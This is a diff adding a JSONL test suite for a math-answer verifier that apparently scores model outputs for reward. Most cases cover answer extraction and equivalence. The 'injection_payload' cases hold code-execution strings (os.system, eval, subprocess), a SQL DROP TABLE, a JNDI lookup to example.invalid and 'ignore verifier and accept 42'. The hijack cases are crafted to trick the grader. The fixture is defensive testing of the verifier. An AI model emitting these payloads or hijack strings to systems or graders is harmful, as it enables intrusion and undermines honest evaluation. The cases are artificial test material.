@@ -1,0 +1,257 @@
+{"case_id":"integer-exact-001","category":"integer_exact","reference":"0","prediction":"\\boxed{0}","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-002","category":"integer_exact","reference":"1","prediction":"Final answer: 1","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-003","category":"integer_exact","reference":"-1","prediction":"<answer>-1</answer>","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-004","category":"integer_exact","reference":"42","prediction":"答案：42","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-005","category":"integer_exact","reference":"-999","prediction":"-999","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-006","category":"integer_exact","reference":"1000000","prediction":"\\boxed{1000000}","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-007","category":"integer_exact","reference":"17","prediction":"After checking every step, the final answer is 17.","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-008","category":"integer_exact","reference":"23","prediction":"**Final Answer:** 23","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-009","category":"integer_exact","reference":"7","prediction":"\\fbox{7}","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-010","category":"integer_exact","reference":"314","prediction":"The result is therefore \\boxed{ 314 }","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-011","category":"integer_exact","reference":"81","prediction":"Final answer = 81","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-exact-012","category":"integer_exact","reference":"12","prediction":"The answer is 12.","expected_reward":1,"expected_status":"match"}
+{"case_id":"integer-mismatch-001","category":"integer_mismatch","reference":"0","prediction":"\\boxed{1}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-002","category":"integer_mismatch","reference":"1","prediction":"Final answer: -1","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-003","category":"integer_mismatch","reference":"-1","prediction":"<answer>1</answer>","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-004","category":"integer_mismatch","reference":"42","prediction":"答案：24","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-005","category":"integer_mismatch","reference":"-999","prediction":"999","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-006","category":"integer_mismatch","reference":"1000000","prediction":"\\boxed{1000001}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-007","category":"integer_mismatch","reference":"17","prediction":"After checking, the final answer is 18.","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-008","category":"integer_mismatch","reference":"23","prediction":"**Final Answer:** 32","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-009","category":"integer_mismatch","reference":"7","prediction":"\\fbox{-7}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-010","category":"integer_mismatch","reference":"314","prediction":"The result is \\boxed{ 313 }","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-011","category":"integer_mismatch","reference":"81","prediction":"Final answer = 80","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"integer-mismatch-012","category":"integer_mismatch","reference":"12","prediction":"The answer is 21.","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"rational-equivalence-001","category":"rational_equivalence","reference":"1/2","prediction":"\\boxed{\\frac{2}{4}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-002","category":"rational_equivalence","reference":"-2/3","prediction":"Final answer: \\frac{-4}{6}","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-003","category":"rational_equivalence","reference":"3/5","prediction":"<answer>0.6</answer>","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-004","category":"rational_equivalence","reference":"7/8","prediction":"\\boxed{87.5%}","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-005","category":"rational_equivalence","reference":"1/4","prediction":"Final answer: 25%","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-006","category":"rational_equivalence","reference":"2/3","prediction":"\\boxed{\\frac{10}{15}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-007","category":"rational_equivalence","reference":"-5/7","prediction":"\\boxed{-\\frac{15}{21}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-008","category":"rational_equivalence","reference":"0","prediction":"Final answer: 0/7","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-009","category":"rational_equivalence","reference":"5","prediction":"\\boxed{20/4}","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-010","category":"rational_equivalence","reference":"11/13","prediction":"<answer>33/39</answer>","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-011","category":"rational_equivalence","reference":"1/100","prediction":"Final answer: 1%","expected_reward":1,"expected_status":"match"}
+{"case_id":"rational-equivalence-012","category":"rational_equivalence","reference":"-1/2","prediction":"\\boxed{-50%}","expected_reward":1,"expected_status":"match"}
+{"case_id":"decimal-units-001","category":"decimal_percent_units","reference":"1/3","prediction":"Final answer: 0.333333","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"decimal-units-002","category":"decimal_percent_units","reference":"1/3","prediction":"Final answer: 0.3333333333333333","expected_reward":1,"expected_status":"match"}
+{"case_id":"decimal-units-003","category":"decimal_percent_units","reference":"1/2","prediction":"\\boxed{0.5}","expected_reward":1,"expected_status":"match"}
+{"case_id":"decimal-units-004","category":"decimal_percent_units","reference":"5","prediction":"\\boxed{5\\text{ cm}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"decimal-units-005","category":"decimal_percent_units","reference":"1","prediction":"Final answer: 100%","expected_reward":1,"expected_status":"match"}
+{"case_id":"decimal-units-006","category":"decimal_percent_units","reference":"1/8","prediction":"<answer>0.125</answer>","expected_reward":1,"expected_status":"match"}
+{"case_id":"decimal-units-007","category":"decimal_percent_units","reference":"5/2","prediction":"\\boxed{2.5}","expected_reward":1,"expected_status":"match"}
+{"case_id":"decimal-units-008","category":"decimal_percent_units","reference":"42","prediction":"\\boxed{42\\text{ kg}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"decimal-units-009","category":"decimal_percent_units","reference":"1/10","prediction":"Final answer: 10%","expected_reward":1,"expected_status":"match"}
+{"case_id":"decimal-units-010","category":"decimal_percent_units","reference":"5","prediction":"Final answer: 500%","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-001","category":"symbolic_equivalence","reference":"(x+1)^2","prediction":"\\boxed{x^2+2x+1}","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-002","category":"symbolic_equivalence","reference":"x^2-1","prediction":"Final answer: (x-1)(x+1)","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-003","category":"symbolic_equivalence","reference":"2*x+2","prediction":"\\boxed{2(x+1)}","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-004","category":"symbolic_equivalence","reference":"\\sin^2(x)+\\cos^2(x)","prediction":"\\boxed{1}","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-005","category":"symbolic_equivalence","reference":"x+y","prediction":"<answer>y+x</answer>","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-006","category":"symbolic_equivalence","reference":"(a+b)^2","prediction":"\\boxed{a^2+2ab+b^2}","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-007","category":"symbolic_equivalence","reference":"\\sqrt{8}","prediction":"Final answer: 2\\sqrt{2}","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-008","category":"symbolic_equivalence","reference":"1/\\sqrt{2}","prediction":"\\boxed{\\frac{\\sqrt{2}}{2}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-009","category":"symbolic_equivalence","reference":"x^3-x","prediction":"\\boxed{x(x-1)(x+1)}","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-010","category":"symbolic_equivalence","reference":"1/x+1/y","prediction":"\\boxed{\\frac{x+y}{xy}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-011","category":"symbolic_equivalence","reference":"x/2+x/3","prediction":"Final answer: 5x/6","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-equivalence-012","category":"symbolic_equivalence","reference":"\\sqrt{50}","prediction":"\\boxed{5\\sqrt{2}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"symbolic-mismatch-001","category":"symbolic_mismatch","reference":"(x+1)^2","prediction":"\\boxed{x^2+1}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"symbolic-mismatch-002","category":"symbolic_mismatch","reference":"x^2-1","prediction":"Final answer: (x-1)^2","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"symbolic-mismatch-003","category":"symbolic_mismatch","reference":"2*x+2","prediction":"\\boxed{2x+1}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"symbolic-mismatch-004","category":"symbolic_mismatch","reference":"\\sin^2(x)+\\cos^2(x)","prediction":"\\boxed{0}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"symbolic-mismatch-005","category":"symbolic_mismatch","reference":"x+y","prediction":"<answer>x-y</answer>","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"symbolic-mismatch-006","category":"symbolic_mismatch","reference":"(a+b)^2","prediction":"\\boxed{a^2+b^2}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"symbolic-mismatch-007","category":"symbolic_mismatch","reference":"\\sqrt{8}","prediction":"Final answer: 3\\sqrt{2}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"symbolic-mismatch-008","category":"symbolic_mismatch","reference":"1/\\sqrt{2}","prediction":"\\boxed{\\frac{1}{2}}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"symbolic-mismatch-009","category":"symbolic_mismatch","reference":"x^3-x","prediction":"\\boxed{x(x-1)}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"symbolic-mismatch-010","category":"symbolic_mismatch","reference":"x/2+x/3","prediction":"Final answer: 4x/6","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"structure-relation-001","category":"sets_and_relations","reference":"\\{1,2,3\\}","prediction":"\\boxed{\\{3,1,2\\}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"structure-relation-002","category":"sets_and_relations","reference":"\\{1,2\\}","prediction":"\\boxed{\\{1,1,2\\}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"structure-relation-003","category":"sets_and_relations","reference":"\\{1,2,3\\}","prediction":"\\boxed{\\{1,2\\}}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"structure-relation-004","category":"sets_and_relations","reference":"x<2","prediction":"\\boxed{2>x}","expected_reward":1,"expected_status":"match"}
+{"case_id":"structure-relation-005","category":"sets_and_relations","reference":"x\\le 3","prediction":"Final answer: 3\\ge x","expected_reward":1,"expected_status":"match"}
+{"case_id":"structure-relation-006","category":"sets_and_relations","reference":"x<2","prediction":"\\boxed{x<3}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"structure-relation-007","category":"sets_and_relations","reference":"\\{1,2\\}","prediction":"\\boxed{(1,2)}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"structure-relation-008","category":"sets_and_relations","reference":"(-\\infty,2]","prediction":"\\boxed{(-\\infty,2]}","expected_reward":1,"expected_status":"match"}
+{"case_id":"structure-relation-009","category":"sets_and_relations","reference":"\\{1,2\\}\\cup\\{3\\}","prediction":"\\boxed{\\{1,2,3\\}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"structure-relation-010","category":"sets_and_relations","reference":"x=2","prediction":"\\boxed{2=x}","expected_reward":1,"expected_status":"match"}
+{"case_id":"precedence-001","category":"answer_surface_precedence","reference":"2","prediction":"\\boxed{2} but final answer: 3","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"precedence-002","category":"answer_surface_precedence","reference":"2","prediction":"Final answer: 3 but then \\boxed{2}","expected_reward":1,"expected_status":"match"}
+{"case_id":"precedence-003","category":"answer_surface_precedence","reference":"2","prediction":"\\boxed{3} and \\boxed{2}","expected_reward":1,"expected_status":"match"}
+{"case_id":"precedence-004","category":"answer_surface_precedence","reference":"2","prediction":"\\boxed{2} and \\boxed{3}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"precedence-005","category":"answer_surface_precedence","reference":"5","prediction":"<answer>4</answer> Final answer: 5","expected_reward":1,"expected_status":"match"}
+{"case_id":"precedence-006","category":"answer_surface_precedence","reference":"5","prediction":"Final answer: 5 then <answer>4</answer>","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"precedence-007","category":"answer_surface_precedence","reference":"7","prediction":"答案：8 then \\fbox{7}","expected_reward":1,"expected_status":"match"}
+{"case_id":"precedence-008","category":"answer_surface_precedence","reference":"7","prediction":"\\fbox{7} then 答案：8","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"precedence-009","category":"answer_surface_precedence","reference":"11","prediction":"Answer: 10\nFinal answer: 11","expected_reward":1,"expected_status":"match"}
+{"case_id":"precedence-010","category":"answer_surface_precedence","reference":"11","prediction":"Final answer: 11\nAnswer: 10","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"precedence-011","category":"answer_surface_precedence","reference":"13","prediction":"\\boxed{12}\n<answer>13</answer>","expected_reward":1,"expected_status":"match"}
+{"case_id":"precedence-012","category":"answer_surface_precedence","reference":"13","prediction":"<answer>13</answer>\n\\boxed{12}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"malformed-001","category":"malformed_surface","reference":"42","prediction":"\\boxed{}","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-002","category":"malformed_surface","reference":"42","prediction":"\\boxed{42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-003","category":"malformed_surface","reference":"42","prediction":"\\boxed 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-004","category":"malformed_surface","reference":"42","prediction":"Final answer:","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-005","category":"malformed_surface","reference":"42","prediction":"<answer></answer>","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-006","category":"malformed_surface","reference":"42","prediction":"<answer>42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-007","category":"malformed_surface","reference":"42","prediction":"<answer><answer>42</answer></answer>","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-008","category":"malformed_surface","reference":"42","prediction":"```\nFinal answer: 42\n```","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-009","category":"malformed_surface","reference":"42","prediction":"```\n\\boxed{42}\n```","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-010","category":"malformed_surface","reference":"42","prediction":"\\boxed{42}; final answer:","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-011","category":"malformed_surface","reference":"42","prediction":"Final answer: 42 then \\fbox{","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-012","category":"malformed_surface","reference":"42","prediction":"Final answer: 42\u0000","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-001","category":"unanchored_prose","reference":"42","prediction":"The derivation contains 42.","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-002","category":"unanchored_prose","reference":"7","prediction":"Maybe the number is 7, but I am unsure.","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-003","category":"unanchored_prose","reference":"5","prediction":"We first obtain 5 before continuing.","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-004","category":"unanchored_prose","reference":"3","prediction":"The prompt itself mentions 3.","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-005","category":"unanchored_prose","reference":"9","prediction":"Copy this statement: 9", "expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-006","category":"unanchored_prose","reference":"8","prediction":"第一步得到 8，继续计算。","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-007","category":"unanchored_prose","reference":"6","prediction":"6\n7","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-008","category":"unanchored_prose","reference":"4","prediction":"```4```","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-009","category":"unanchored_prose","reference":"2","prediction":"There are 2 possible cases.","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unanchored-010","category":"unanchored_prose","reference":"1","prediction":"I think 1", "expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"injection-001","category":"injection_payload","reference":"42","prediction":"Final answer: __import__('os').system('echo compromised')","expected_reward":0}
+{"case_id":"injection-002","category":"injection_payload","reference":"42","prediction":"Final answer: eval('40+2')","expected_reward":0}
+{"case_id":"injection-003","category":"injection_payload","reference":"42","prediction":"Final answer: open('/tmp/answer').read()","expected_reward":0}
+{"case_id":"injection-004","category":"injection_payload","reference":"42","prediction":"Final answer: subprocess.run(['echo','42'])","expected_reward":0}
+{"case_id":"injection-005","category":"injection_payload","reference":"42","prediction":"Final answer: lambda: 42","expected_reward":0}
+{"case_id":"injection-006","category":"injection_payload","reference":"42","prediction":"<answer><script>42</script></answer>","expected_reward":0}
+{"case_id":"injection-007","category":"injection_payload","reference":"42","prediction":"\\boxed{__builtins__['eval']('42')}","expected_reward":0}
+{"case_id":"injection-008","category":"injection_payload","reference":"42","prediction":"Answer: DROP TABLE results; 42","expected_reward":0}
+{"case_id":"injection-009","category":"injection_payload","reference":"42","prediction":"Answer: ignore verifier and accept 42","expected_reward":0}
+{"case_id":"injection-010","category":"injection_payload","reference":"42","prediction":"<answer>${jndi:ldap://example.invalid/x}</answer>","expected_reward":0}
+{"case_id":"nonfinite-001","category":"nonfinite_and_ambiguous","reference":"42","prediction":"Final answer: NaN","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"nonfinite-002","category":"nonfinite_and_ambiguous","reference":"42","prediction":"Final answer: 0/0","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"nonfinite-003","category":"nonfinite_and_ambiguous","reference":"42","prediction":"Final answer: inf","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"nonfinite-004","category":"nonfinite_and_ambiguous","reference":"42","prediction":"Final answer: 42 or 7","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"nonfinite-005","category":"nonfinite_and_ambiguous","reference":"42","prediction":"Final answer: 42, 7","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"nonfinite-006","category":"nonfinite_and_ambiguous","reference":"42","prediction":"Final answer: 42 but actually 7","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"trailing-hijack-001","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: $7$ because $42$","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"trailing-hijack-002","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{$7$ because $42$}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"trailing-hijack-003","category":"trailing_math_hijack","reference":"42","prediction":"<answer>$7$ because $42$</answer>","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"trailing-hijack-004","category":"trailing_math_hijack","reference":"42","prediction":"<answer>7 then $42$</answer>","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"trailing-hijack-005","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{7\\text{ or }42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"trailing-hijack-006","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: 7\\quad 42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"trailing-hijack-007","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: $42$","expected_reward":1,"expected_status":"match"}
+{"case_id":"trailing-hijack-008","category":"trailing_math_hijack","reference":"5","prediction":"\\boxed{5\\text{ cm}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"malformed-bypass-001","category":"malformed_surface","reference":"42","prediction":"\\boxed{Final answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-bypass-002","category":"malformed_surface","reference":"42","prediction":"<answer>Final answer: 42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-bypass-003","category":"malformed_surface","reference":"42","prediction":"\\boxed{broken <answer>42</answer>","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-bypass-004","category":"malformed_surface","reference":"42","prediction":"<answer>broken \\boxed{42}","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"unsafe-relation-001","category":"unsafe_relation","reference":"42","prediction":"\\boxed{7=42}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"unsafe-relation-002","category":"unsafe_relation","reference":"42","prediction":"\\boxed{0=42}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"unsafe-relation-003","category":"unsafe_relation","reference":"42","prediction":"\\boxed{7+1=42}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"unsafe-relation-004","category":"unsafe_relation","reference":"42","prediction":"\\boxed{42=x}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"unsafe-relation-005","category":"unsafe_relation","reference":"42","prediction":"\\boxed{x=42}","expected_reward":1,"expected_status":"match"}
+{"case_id":"unsafe-relation-006","category":"unsafe_relation","reference":"x=42","prediction":"\\boxed{42}","expected_reward":1,"expected_status":"match"}
+{"case_id":"unsafe-relation-007","category":"unsafe_relation","reference":"7=42","prediction":"\\boxed{0=42}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"unsafe-relation-008","category":"unsafe_relation","reference":"x=42","prediction":"\\boxed{y=42}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"unsafe-relation-009","category":"unsafe_relation","reference":"x=42","prediction":"\\boxed{42=x}","expected_reward":1,"expected_status":"match"}
+{"case_id":"invalid-reference-001","category":"invalid_reference","reference":"","prediction":"Final answer: 42","expected_reward":null,"expected_status":"reference_invalid"}
+{"case_id":"invalid-reference-002","category":"invalid_reference","reference":"   ","prediction":"Final answer: 42","expected_reward":null,"expected_status":"reference_invalid"}
+{"case_id":"invalid-reference-003","category":"invalid_reference","reference":"not a mathematical reference","prediction":"Final answer: 42","expected_reward":null,"expected_status":"reference_invalid"}
+{"case_id":"invalid-reference-004","category":"invalid_reference","reference":"42\u0000","prediction":"Final answer: 42","expected_reward":null,"expected_status":"reference_invalid"}
+{"case_id":"logical-hijack-001","category":"unsafe_relation","reference":"42","prediction":"\\boxed{x=0 \\land y=42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"logical-hijack-002","category":"unsafe_relation","reference":"42","prediction":"\\boxed{x=0 \\wedge y=42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"logical-hijack-003","category":"unsafe_relation","reference":"42","prediction":"\\boxed{x=0 \\& y=42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"logical-hijack-004","category":"unsafe_relation","reference":"42","prediction":"\\boxed{x=0=42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"logical-hijack-005","category":"unsafe_relation","reference":"42","prediction":"\\boxed{x<0 \\lor y<42}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"logical-hijack-006","category":"unsafe_relation","reference":"42","prediction":"\\boxed{0<x<42}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"nested-container-001","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{x=0\\boxed{42}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"nested-container-002","category":"trailing_math_hijack","reference":"42","prediction":"<answer>x=0\\boxed{42}</answer>","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"nested-container-003","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{0\\fbox{42}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-001","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0 42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-002","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\,42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-003","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\text{}42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"nested-container-004","category":"trailing_math_hijack","reference":"42","prediction":"<answer>\\boxed{42}</answer>","expected_reward":1,"expected_status":"match"}
+{"case_id":"nested-container-005","category":"trailing_math_hijack","reference":"42","prediction":"\\boxed{\\boxed{42}}","expected_reward":1,"expected_status":"match"}
+{"case_id":"assignment-family-001","category":"unsafe_relation","reference":"42","prediction":"\\boxed{x=\\{42\\}}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"assignment-family-002","category":"unsafe_relation","reference":"\\{42\\}","prediction":"\\boxed{x=42}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"assignment-family-003","category":"unsafe_relation","reference":"x=42","prediction":"\\boxed{x=\\{42\\}}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"assignment-family-004","category":"unsafe_relation","reference":"x=\\{42\\}","prediction":"\\boxed{x=42}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"assignment-family-005","category":"unsafe_relation","reference":"42","prediction":"\\boxed{x=\\begin{pmatrix}42\\end{pmatrix}}","expected_reward":0,"expected_status":"mismatch"}
+{"case_id":"numeric-gap-004","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\ 42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-005","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\quad42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-006","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\qquad42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-007","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\thinspace42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-008","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\medspace42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-009","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\thickspace42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-010","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\negthinspace42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"numeric-gap-011","category":"trailing_math_hijack","reference":"42","prediction":"Final answer: x=0\\hfil42","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"escaped-box-001","category":"answer_surface_precedence","reference":"42","prediction":"\\boxed{7} \\\\boxed{42}","expected_reward":0,"expected_status":"mismatch","notes":"an escaped box command is literal text and cannot become the last surface"}
+{"case_id":"escaped-box-002","category":"answer_surface_precedence","reference":"42","prediction":"Final answer: 7 \\\\boxed{42}","expected_reward":0,"expected_status":"prediction_unparseable","notes":"an escaped box inside a text-marker candidate cannot supply a hidden rightmost value"}
+{"case_id":"escaped-box-003","category":"answer_surface_precedence","reference":"42","prediction":"\\boxed{7} \\\\\\boxed{42}","expected_reward":1,"expected_status":"match","notes":"with three source backslashes the last one still begins a real box command"}
+{"case_id":"malformed-command-boundary-001","category":"malformed_surface","reference":"42","prediction":"\\boxed42","expected_reward":0,"expected_status":"prediction_not_extracted","notes":"a TeX control word ends before a digit but still requires an opening brace"}
+{"case_id":"malformed-command-boundary-002","category":"malformed_surface","reference":"42","prediction":"\\fbox42","expected_reward":0,"expected_status":"prediction_not_extracted"}
+{"case_id":"malformed-command-boundary-003","category":"malformed_surface","reference":"42","prediction":"Final answer: 7 \\boxed42","expected_reward":0,"expected_status":"prediction_not_extracted","notes":"a malformed later command owns precedence and cannot expose the rightmost number"}
+{"case_id":"juxtaposition-001","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{0\\frac{42}{1}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-002","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{x=0\\dfrac{42}{1}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-003","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{0(42)}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-004","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{x=0\\left(42\\right)}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-005","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{0\\binom{42}{1}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-006","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{(1)(41)}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-007","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{\\frac{1}{1}\\frac{41}{1}}","expected_reward":0,"expected_status":"prediction_unparseable"}
+{"case_id":"juxtaposition-008","category":"ambiguous_juxtaposition","reference":"42","prediction":"\\boxed{{1}{41}}","expected_reward":0,"expected_status":"prediction_unparseable"}
